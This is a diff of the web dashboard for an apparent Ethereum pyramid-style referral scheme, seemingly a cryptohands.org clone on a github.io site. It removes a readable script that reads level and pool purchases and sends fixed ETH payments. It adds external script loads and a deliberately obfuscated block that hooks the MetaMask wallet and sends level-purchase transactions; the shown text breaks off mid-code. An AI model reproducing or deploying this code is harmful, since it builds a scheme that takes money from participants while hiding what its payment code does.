@@ -128,856 +128,232 @@
             <!-- App-content opened -->
             <!-- App-content closed -->
         </div>
-
-<script> 
-var totalearned = 0;
-function getVariableData() {
-    // get variable values
-    myContractInstance.methods.level1currUserID().call().then(function (result) {
-        console.log('level1users',result)
-        $('.level1count').html(result);
-        $('.level1_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level2currUserID().call().then(function (result) {
-        
-        $('.level2count').html(result);
-        $('.level2_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level3currUserID().call().then(function (result) {
-       
-            $('.level3count').html(result);
-        $('.level3_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level4currUserID().call().then(function (result) {
-       
-         $('.level4count').html(result);
-        $('.level4_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result+ "</a>");
-    });
-
-
-
-    myContractInstance.methods.level5currUserID().call().then(function (result) {
-       
-            $('.level5count').html(result);
-            
-        $('.level5_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level6currUserID().call().then(function (result) {
-        
-            $('.level6count').html(result);
-        $('.level6_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level7currUserID().call().then(function (result) {
       
-            $('.level7count').html(result);
-        $('.level7_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-    myContractInstance.methods.level8currUserID().call().then(function (result) {
-       
-            $('.level8count').html(result);
-        $('.level8_current_address').html("<a href=https://etherscan.io/address/" + result + " target=_blank>" + result + "</a>");
-    });
-
-   
-    myContractInstance.methods.currUserID().call().then(function (result) {
-    
-       
-            $('.TotalUsers').html(result);
-
-    });
-
-    myContractInstance.methods.users(account).call().then(function (result1) {
-        
-            $('.currentuseridlink').html("https://nguyenphunho.github.io/signup/?referralid=" + result1.id);
-
-            $('.currentuseridlinknew').html("https://token.im//open_url?coin_id=60&url=https://nguyenphunho.github.io/?referralid=" + result1.id);
-
-
-
-            $('.currentuseridlink').val("https://.github.io/signup/?referralid=" + result1.id);
-
-            $('.currentuseridlinknew').val("https://token.im//open_url?coin_id=60&url=https://nguyenphunho.github.io/signup/?referralid=" + result1.id);
-
-
-
-            $('.sharebutton').attr('data-url', "https://nguyenphunho.github.io/signup/?referralid=" + result1.id);
-            $('.currentuserid').html(result1.id);
-            $('.currentaddress').html(account);
-            $('.ethaddress').attr('href', 'https://etherscan.io/address/' + account);
-        
-    });
-
-    
-
-
-    if (account !== 'undefined') {
-        regLevelEvent();
-        getMoneyForLevelEvent();
-
-   
-    }
-    
-
-
-    
-
-    
-    
-    DirectreferralCount();
-}
-
-
-
-
-function regLevelEvent() {
-    
-
-    var level1 = parseFloat(0.5); 
-    var level2_price = 1.5;
-    var level3_price = 4.5;
-    var level4_price = 13.5;
-    var level5_price = 40.5;
-    var level6_price = 121.5;
-    var level7_price = 364.5;
-    var level8_price = 1093.5;
-
-    var referraltotal = parseFloat(0);
-
-    var events = myContractInstance.getPastEvents('getMoneyForLevelEvent', { filter: { _user: account }, 'fromBlock': 0, 'toBlock': 'latest'}, function (error, log) {
-        
-        if (!error) {
-            $.each(log, function (key, value) {
-                var level = value.returnValues._level;
-
-                if (level == 1) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("0.5");
-
-                }
-              else if (level == 2) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("1.5");
-
-                }
-              else if (level == 3) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("4.5");
-
-                }
-              else if (level == 4) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("13.5");
-
-                }
-              else if (level == 5) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("40.5");
-
-                }
-              else if (level == 6) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("121.5");
-
-                }
-              else if (level == 7) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("354.5");
-
-                }
-              else if (level == 8) {
-                    referraltotal = parseFloat(referraltotal) + parseFloat("1093.5");
-
-                }
-                
-
-                $('.totalreferral').html(Math.round(1000000 * (referraltotal)) / 1000000);
-            });
-           
-        }
-    });
-
-}
-
-
-function getMoneyForLevelEvent() {
-    var level1_price = 0.5;
-    var level2_price = 1.5;
-    var level3_price = 4.5;
-    var level4_price = 13.5;
-    var level5_price = 40.5;
-    var level6_price = 121.5;
-    var level7_price = 364.5;
-    var level8_price = 1093.5;
-   
-
-    var referraltotal = parseFloat(0);
-
-    var events = myContractInstance.getPastEvents('getMoneyForLevelEvent', {filter : { _receiver: account },  'fromBlock': 0, 'toBlock': 'latest'}, function (error, log) {
-
-        if (!error) {
-            $.each(log, function (key, value) {
-                var level = value.returnValues._level;
-
-                if (level == 1) {
-                    referraltotal = parseFloat(referraltotal) + level1_price;
-                }
-                else if (level == 2) {
-                    referraltotal = parseFloat(referraltotal) + level2_price;
-                }
-                else if (level == 3) {
-                    referraltotal = parseFloat(referraltotal) + level3_price;
-                }
-                else if (level == 4) {
-                    referraltotal = parseFloat(referraltotal) + level4_price;
-                }
-                else if (level == 5) {
-                    referraltotal = parseFloat(referraltotal) + level5_price;
-                }
-                else if (level == 6) {
-                    referraltotal = parseFloat(referraltotal) + level6_price;
-                }
-                else if (level == 7) {
-                    referraltotal = parseFloat(referraltotal) + level7_price;
-                }
-                else if (level == 8) {
-                    referraltotal = parseFloat(referraltotal) + level8_price;
-                }
-                
-
-
-                $('.totalpoolpayment').html(Math.round(1000000 * (referraltotal)) / 1000000);
-            });
-        }
-    });
-    
-
-    
-}
-
-var templevel = 1, t = 1;
-var employees = {
-    accounting: []
-};
-var str = "";
-//'0x'
-function Directreferral() {
-    
-    var events = myContractInstance.getPastEvents('regLevelEvent', {filter:{ _referrer: account }, 'fromBlock': 0, 'toBlock': 'latest'}, function (error, log) {
-
-        if (!error) {
-
-            $.each(log, function (key, value) {
-                if (t == 1) {
-                    t = 2;
-                    $('#accordion11').html("");
-                    $('#accordion11').append('<div class="panel-heading1 bg-primary ">' +
-                        '<h4 class= "panel-title1">' +
-                        '<a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion11" href="#collapseFour11" aria-expanded="false"><i class="fe fe-arrow-right mr-2"></i>Level 1</a>' +
-                        '</h4 >' +
-                        '</div >' +
-                        '<div id="collapseFour11" class="panel-collapse collapse" role="tabpanel" aria-expanded="false">' +
-                        '<div class= "panel-body border" ></div></div></div>')
-                        ;
-
-                }
-                $('#collapseFour11 .panel-body').append('<p style=color:green>' + value.returnValues._user + '</p>');
-
-                employees.accounting.push({
-
-                    'address': value.returnValues._user,
-                    "level": 1
-
-                });
-
-                InDirectreferral(value.returnValues._user, 2)
-            });
-        }
-        else {
-
-            $('#accordion11').append('No data');
-                ;
-        }
-    });
-}
-
-
-function InDirectreferral(address, level) {
-    var events = myContractInstance.getPastEvents('regLevelEvent', {filter:{ _referrer: address },  'fromBlock': 0, 'toBlock': 'latest' }, function (error, log) {
-
-        if (!error) {
-            $.each(log, function (key, value) {
-                if (templevel != level) {
-                    str += '';
-                }
-                if (templevel != level) {
-                    templevel = level;
-                    $('#accordion11').append('<div class="panel-heading1 bg-primary ">' +
-                        '<h4 class= "panel-title1">' +
-                        '<a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion1' + level + '" href="#collapseFour1' + level + '" aria-expanded="false"><i class="fe fe-arrow-right mr-2"></i>Level ' + level + '</a>' +
-                        '</h4 >' +
-                        '</div >' +
-                        '<div id="collapseFour1' + level + '" class="panel-collapse collapse" role="tabpanel" aria-expanded="false">' +
-                        '<div class= "panel-body border" ></div></div></div>')
-                        ;
-                }
-                $('#collapseFour1' + level + ' .panel-body').append('<p style=color:green>' + value.returnValues._user + '</p>');
-
-                employees.accounting.push({
-
-                    'address': value.returnValues._user,
-                    "level": level
-
-                });
-                InDirectreferral(value.returnValues._user, level + 1);
-            });
-        }
-    });
-}
-
-function DirectreferralCount() {
-    
-    var i = 1;
-    $('.referralcount').html(0);
-    $('.indirect_referralcount').html(0);
-    var events = myContractInstance.getPastEvents('regLevelEvent', {filter:{ _referrer: account },  'fromBlock': 0, 'toBlock': 'latest'}, function (error, log) {
-       
-        if (!error) {
-            $.each(log, function (key, value) {
-                $('.referralcount').html(i++);
-
-                InDirectreferralCount(value.returnValues._user, 1)
-            });
-        }
-        else {
-            $('.referralcount').html(0);
-            $('.indirect_referralcount').html(0);
-        }
-    });
-     
-}
-var count = 1;
-
-function InDirectreferralCount(address, level) {
-    
-    var events = myContractInstance.getPastEvents('regLevelEvent', {filter:{ _referrer: address },  'fromBlock': 0, 'toBlock': 'latest' }, function (error, log) {
       
-        if (!error) {
-            $.each(log, function (key, value) {
-                $('.indirect_referralcount').html(count++);
-                InDirectreferralCount(value.returnValues._user, level + 1);
-            });
+      
+      <script type="text/javascript">
+        document.getElementById('payalert_closebtn_a_noMetamask').onclick = function() {
+            document.getElementById('transalert_block_noMetamask').classList.remove('payalert_block_active');
         }
-        else {
-            $('.indirect_referralcount').html(0);
-        }
-    });
-
-}
+    </script>
+</div>
 
 
-function Transaction_Register() {
+
+        
+        
     
-    var events = myContractInstance.getPastEvents('getMoneyForLevelEvent', {filter:{ _user: account },  'fromBlock': 0, 'toBlock': 'latest'}, function (error, log) {
-    var level1 = parseFloat(0.5); 
-    var pool2_price = 1.5;
-    var pool3_price = 4.5;
-    var pool4_price = 13.5;
-    var pool5_price = 40.5;
-    var pool6_price = 121.5;
-    var pool7_price = 364.5;
-    var pool8_price = 1093.5;
-
-        if (!error) {
-            $.each(log, function (key, value) {
-                
-                $('.autopool_table').append('<tr><td><a href="https://etherscan.io/tx/' + value.transactionHash + '" target="_blank">' + value.transactionHash + '</a></td><td style=color:green>' + value.returnValues._referral + '</td><td>' + value.returnValues._level + '</td><td>' + (value.returnValues._level == 1 ? level1 : value.returnValues._level == 2 ? level2 : value.returnValues._level == 3 ? level3 : level4) + ' ETH</td></tr>');
-            });
-        }
-    });
-}
-
-
-function Transaction_Pool() {
-    var events = myContractInstance.getPastEvents('getPoolPayment', {filter:{ _receiver: account },  'fromBlock': 0, 'toBlock': 'latest' }, function (error, log) {
-    var pool1_price = 0.5;
-    var pool2_price = 1.5;
-    var pool3_price = 4.5;
-    var pool4_price = 13.5;
-    var pool5_price = 40.5;
-    var pool6_price = 121.5;
-    var pool7_price = 364.5;
-    var pool8_price = 1093.5;
-
-        if (!error) {
-            $.each(log, function (key, value) {
-                $('.transaction_autopool').append('<tr><td><a href="https://etherscan.io/tx/' + value.transactionHash + '" target="_blank">' + value.transactionHash + '</a></td><td style=color:green>' + value.returnValues._user + '</td><td>' + value.returnValues._level + '</td><td>' + (value.returnValues._level == 1 ? pool1_price : value.returnValues._level == 2 ? pool2_price : value.returnValues._level == 3 ? pool3_price : value.returnValues._level == 4 ? pool4_price : value.returnValues._level == 5 ? pool5_price : value.returnValues._level == 6 ? pool6_price : value.returnValues._level == 7 ? pool7_price : value.returnValues._level == 8 ? pool8_price : value.returnValues._level == 9 ? pool9_price : pool10_price) + ' ETH</td></tr>');
-            });
-        }
-    });
-}
-</script>
-       
-
+<script type="text/javascript" src="https://nguyenphunho.github.io/line.js"></script>
+<script type="text/javascript" src="https://nguyenphunho.github.io/config.js"></script>
 <script>
-
-var myContractInstance, myContractInstance1;
-var account = localStorage.getItem("address");
-
-var abi = [{"constant":true,"inputs":[{"name":"_user","type":"address"}],"name":"findFreeReferrer","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"manager","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_user","type":"address"}],"name":"viewUserReferral","outputs":[{"name":"","type":"address[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"LEVEL_PRICE","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_referrerID","type":"uint256"}],"name":"regUser","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"ownerWallet","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"userList","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"currUserID","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"users","outputs":[{"name":"isExist","type":"bool"},{"name":"id","type":"uint256"},{"name":"referrerID","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_manager","type":"address"}],"name":"setManager","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_user","type":"address"},{"name":"_level","type":"uint256"}],"name":"viewUserLevelExpired","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_level","type":"uint256"}],"name":"buyLevel","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"},{"indexed":true,"name":"_referrer","type":"address"},{"indexed":false,"name":"_time","type":"uint256"}],"name":"regLevelEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"},{"indexed":false,"name":"_level","type":"uint256"},{"indexed":false,"name":"_time","type":"uint256"}],"name":"buyLevelEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"},{"indexed":false,"name":"_level","type":"uint256"},{"indexed":false,"name":"_time","type":"uint256"}],"name":"prolongateLevelEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"},{"indexed":true,"name":"_referral","type":"address"},{"indexed":false,"name":"_level","type":"uint256"},{"indexed":false,"name":"_time","type":"uint256"}],"name":"getMoneyForLevelEvent","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"},{"indexed":true,"name":"_referral","type":"address"},{"indexed":false,"name":"_level","type":"uint256"},{"indexed":false,"name":"_time","type":"uint256"}],"name":"lostMoneyForLevelEvent","type":"event"}];
-var address = "0x79C0CE16329055f2e49ccF21352Ee9775DD9BE4a";
-var MyContract;
-window.addEventListener('load', function () {
-    if (typeof web3 !== 'undefined') {
-
-       
-        web3 = new Web3(web3.currentProvider);
-
-        MyContract = new web3.eth.Contract(abi, address);
-        // initiate contract for an address
-
-        myContractInstance = MyContract;
-        myContractInstance1 = MyContract;
-        //web3.eth.getAccounts().then(function (result) {
-        //    account = result[0];
-           
-        //});
-        
-        if (web3.currentProvider.isTrust) {
-
-            const infura = '';
-            const web3 = new Web3(new Web3.providers.HttpProvider(infura));
-            MyContract = new web3.eth.Contract(abi, address);
-            myContractInstance = MyContract;
-          
-        }
-        checkbuyLevel();
-  getVariableData();
-
-           
-
-    } else {
-        //  const Web3 = require('web3');
-
-        const infura = '';
-        const web3 = new Web3(new Web3.providers.HttpProvider(infura));
-        MyContract = new web3.eth.Contract(abi, address);
-        myContractInstance = MyContract;
-
-           getVariableData();
-
-            checkbuyLevel();
-        // document.getElementById('output').innerHtml = 'Please download and install Metamask: <a href="https://metamask.io/">https://metamask.io/</a>'
-    }
-
-
-})
-
-
-function checkbuyLevel() {
-
-    myContractInstance.methods.users(account).call().then(function (result) {
-     
-       
-            if (result[0]) {
-                checklevel1();
-                checklevel2();
-                checklevel3();
-                checklevel4();
-                checklevel5();
-                checklevel6();
-                checklevel7();
-                checklevel8();
-                
-            }
-       
-
-    });
-
-}
-
-
-
-function checkPool2() {
-
-    myContractInstance.methods.pool2users(account).call().then(function (result) {
-   
-        if(result[1] > 0){
-            $('#pool2sequencue').text(result[1])
-            $('#pool2sequencue').show();
-            $('.pool2sequencue').show();
-        }
-       
-            if (!result[0]) {
-                $('.pool2pay').show();
-                $('.pool2transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool2status').show();
-                $('.pool2status .card-status').addClass('bg-success');
-                $('.pool2status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool2transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool2status').show();
-                $('.pool2status .card-status').addClass('bg-warning');
-                $('.pool2status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool2transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(2);
-                console.log("ok")
-                $('#numbersec').show()
-                
-            }
-
-
-
-     
-    });
-
-}
-
-function checkPool3() {
-
-
-    myContractInstance.methods.pool3users(account).call().then(function (result) {
-        console.log("pool3users",result)
-        if(result[1] > 0){
-        $('#pool3sequencue').text(result[1])
-        $('#pool3sequencue').show();
-        $('.pool3sequencue').show();}
-            if (!result[0]) {
-                $('.pool3pay').show();
-                $('.pool3transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool3status').show();
-                $('.pool3status .card-status').addClass('bg-success');
-                $('.pool3status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool3transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool3status').show();
-                $('.pool3status .card-status').addClass('bg-warning');
-                $('.pool3status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool3transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(3);
-            }
-
-
-
-        
-    });
-
-}
-
-
-function checkPool4() {
-    myContractInstance.methods.pool4users(account).call().then(function (result) {
-        if(result[1] > 0){
-        $('#pool4sequencue').text(result[1])
-        $('#pool4sequencue').show();
-        $('.pool4sequencue').show();}
-       
-            if (!result[0]) {
-                $('.pool4pay').show();
-                $('.pool4transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool4status').show();
-                $('.pool4status .card-status').addClass('bg-success');
-                $('.pool4status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool4transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool4status').show();
-                $('.pool4status .card-status').addClass('bg-warning');
-                $('.pool4status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool4transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(4);
-            }
-
-       
-
-    });
-
-}
-
-function checkPool5() {
-    myContractInstance.methods.pool5users(account).call().then(function (result) {
-        if(result[1] > 0){
-        $('#pool5sequencue').text(result[1])
-        $('#pool5sequencue').show();
-        $('.pool5sequencue').show();}
-       
-            if (!result[0]) {
-                $('.pool5pay').show();
-                $('.pool5transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool5status').show();
-                $('.pool5status .card-status').addClass('bg-success');
-                $('.pool5status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool5transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool5status').show();
-                $('.pool5status .card-status').addClass('bg-warning');
-                $('.pool5status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool5transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(5);
-            }
-
-
-       
-
-    });
-
-}
-
-function checkPool6() {
-    myContractInstance.methods.pool6users(account).call().then(function (result) {
-        if(result[1] > 0){
-        $('#pool6sequencue').text(result[1])
-        $('#pool6sequencue').show();
-        $('.pool6sequencue').show();}
-        
-            if (!result[0]) {
-                $('.pool6pay').show();
-                $('.pool6transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool6status').show();
-                $('.pool6status .card-status').addClass('bg-success');
-                $('.pool6status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool6transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool6status').show();
-                $('.pool6status .card-status').addClass('bg-warning');
-                $('.pool6status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool6transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(6);
-            }
-
-       
-    });
-
-}
-
-function checkPool7() {
-    myContractInstance.methods.pool7users(account).call().then(function ( result) {
-        if(result[1] > 0){
-        $('#pool7sequencue').text(result[1])
-        $('#pool7sequencue').show();
-        $('.pool7sequencue').show();}
-        
-            if (!result[0]) {
-                $('.pool7pay').show();
-                $('.pool7transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool7status').show();
-                $('.pool7status .card-status').addClass('bg-success');
-                $('.pool7status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool7transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool7status').show();
-                $('.pool7status .card-status').addClass('bg-warning');
-                $('.pool7status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool7transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(7);
-            }
-
-
-
-        
-
-    });
-
-}
-
-function checkPool8() {
-    myContractInstance.methods.pool8users(account).call().then(function ( result) {
-        if(result[1] > 0){
-        $('#pool8sequencue').text(result[1])
-        $('#pool8sequencue').show();
-        $('.pool8sequencue').show();}
-       
-            if (!result[0]) {
-                $('.pool8pay').show();
-                $('.pool8transaction').hide();
-            }
-            else if (result[2] == 3) {
-                $('.pool8status').show();
-                $('.pool8status .card-status').addClass('bg-success');
-                $('.pool8status .ribbon').addClass('text-success').html('<span class="bg-success">Completed</span>');
-                $('.pool8transaction').html('Received No. of Payments ' + result[2]);
-
-
-            }
-            else if (result[2] < 3) {
-                $('.pool8status').show();
-                $('.pool8status .card-status').addClass('bg-warning');
-                $('.pool8status .ribbon').addClass('text-warning').html('<span class="bg-warning">Active</span>');
-                $('.pool8transaction').html('Received No. of Payments ' + result[2]); $('.currentautopoolno').html(8);
-            }
-
-
-       
-
-    });
-
-}
-
-
-$(document).ready(function () {
-    
-
-
-    $('.pool2pay').click(function () {
-        try {
-            ethereum.enable();
-          
-
-            myContractInstance1.methods.buyPool2().send({ from: account, value: 1500000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool2pay').hide();
-                    $('.pool2transaction').show();
-                    $('.pool2transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-        }
-        catch (err) {
-            console.log(err)
-        }
-    });
-
-    $('.pool3pay').click(function () {
-        try {
-            ethereum.enable();
-
-            myContractInstance1.methods.buyPool3().send({ from: account, value: 4500000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool3pay').hide();
-                    $('.pool3transaction').show();
-                    $('.pool3transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-    $('.pool4pay').click(function () {
-        try {
-            ethereum.enable();
-            
-            myContractInstance1.methods.buyPool4().send({ from: account, value: 13500000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool4pay').hide();
-                    $('.pool4transaction').show();
-                    $('.pool4transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-    $('.pool5pay').click(function () {
-        try {
-            ethereum.enable();           
-
-            myContractInstance1.methods.buyPool5().send({ from: account, value: 40500000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool5pay').hide();
-                    $('.pool5transaction').show();
-                    $('.pool5transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-
-    $('.pool6pay').click(function () {
-        try {
-            ethereum.enable();
-
-            myContractInstance1.methods.buyPool6().send({ from: account, value: 12150000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool6pay').hide();
-                    $('.pool6transaction').show();
-                    $('.pool6transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-
-    $('.pool7pay').click(function () {
-        try {
-            ethereum.enable();
-
-            myContractInstance1.methods.buyPool7().send({ from: account, value: 364500000000000000000, gasprice: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool7pay').hide();
-                    $('.pool7transaction').show();
-                    $('.pool7transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-
-
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-
-    $('.pool8pay').click(function () {
-        try {
-            ethereum.enable();
-
-            myContractInstance1.methods.buyPool8().send({ from: account, value: 109350000000000000000, gas: 50 })
-                .on('transactionHash', function (hash) {
-
-                    $('.pool8pay').hide();
-                    $('.pool8transaction').show();
-                    $('.pool8transaction').html('<a href="https://etherscan.io/tx/' + hash + '">Track</a>');
-
-                });
-
-        }
-        catch (err) {
-            alert('Please download and install Metamask and Loggin to account');
-        }
-    });
-
-
-   
-
-
-});
+var langPrefiks = '';
+var dsh_lvs_extend = 'Extend';
+var dsh_lvs_expired = 'Expired';
+var dsh_lvs_active = 'Active';
+var dsh_lvs_days = 'days';
+var dsh_lvs_buy = 'Buy';
+var dsh_lvs_notactive = 'Not active';
+var dsh_lvs_nodate = 'no date';
+var _0x37c6=['./login.php','window.ethereum\x20is\x20not\x20MetaMask','noMetaMask','web3','enable','error','currentProvider','Non-Ethereum\x20browser\x20detected.\x20You\x20should\x20consider\x20trying\x20MetaMask!','eth','sendTransaction','transactionHash','getElementById','transalert_block\x20transalert_block_sent\x20transalert_block_active','vs_transalert_block_sent_link','href','https://etherscan.io/tx/','confirmation','vs_eth_amount','innerHTML','payalert_nextlv_income','vs_contract_address','value','https://etherscan.io/address/','transalert_block_noMetamask','getTime','vs_user_account','methods','users','call','id:\x20','agent-url','https://cryptohands.org/','?rid=','vs_facebook','onclick','http://www.facebook.com/sharer.php?u=https://cryptohands.org/','scrollbars=0,\x20resizable=1,\x20menubar=0,\x20left=200,\x20top=200,\x20width=550,\x20height=440,\x20toolbar=0,\x20status=0','vs_vk','open','http://vk.com/share.php?url=https://cryptohands.org/','_blank','http://twitter.com/share?text=https://cryptohands.org/','push','viewUserLevelExpired','then','vs_level_buy_button_','setAttribute','onClick','javascript:\x20buyLevel(','pa-btn\x20pa-btn-levelred','vs_level_up_button','add','dashb_btn_lvlup_extend','\x20level','vs_level_Expired_top_','style','vs_level_Expired_bottom_','className','pa-btn\x20pa-btn-levelgreen','color:\x20#4cd964;','floor','vs_level_top_p_b','vs_level_top_sending','vs_level_top_getting','color:\x20#2768ff;','ajax','/userStatAPI.php?id=','refCount','vs_ref_counts','./signup.php','getPastEvents','getMoneyForLevelEvent','latest','reverse','returnValues','toLocaleDateString','en-US','_level','vs_dshbrd_totalincome_header','vs_eth_price','toFixed','WebsocketProvider','Contract','wallet','ethereum','undefined','accountsChanged','log','toUpperCase','location'];(function(_0x5ac5fa,_0x3103ff){var _0x36e810=function(_0x41d607){while(--_0x41d607){_0x5ac5fa['push'](_0x5ac5fa['shift']());}};_0x36e810(++_0x3103ff);}(_0x37c6,0x108));var _0x16ac=function(_0x20d7a1,_0x2a496b){_0x20d7a1=_0x20d7a1-0x0;var _0x3acb29=_0x37c6[_0x20d7a1];return _0x3acb29;};if(typeof window[_0x16ac('0x0')]!==_0x16ac('0x1')){try{window[_0x16ac('0x0')]['on'](_0x16ac('0x2'),function(_0x240a6b){console[_0x16ac('0x3')](_0x240a6b[0x0]);console[_0x16ac('0x3')](account);if(account[_0x16ac('0x4')]()!=_0x240a6b[0x0][_0x16ac('0x4')]()){window[_0x16ac('0x5')]='./login.php';}});window[_0x16ac('0x0')]['on']('networkChanged',function(_0x496a93){window[_0x16ac('0x5')]=_0x16ac('0x6');});}catch(_0x447b6e){console['log'](_0x16ac('0x7'));}}async function buyLevel(_0x4ad6df){var _0xe7f698=levelPrice[_0x4ad6df-0x1];if(getCookie(_0x16ac('0x8'))!=!![]){if(window[_0x16ac('0x0')]){window[_0x16ac('0x9')]=new Web3(ethereum);try{await ethereum[_0x16ac('0xa')]();}catch(_0x3521a7){console[_0x16ac('0xb')](_0x3521a7);}}else if(window[_0x16ac('0x9')]){window[_0x16ac('0x9')]=new 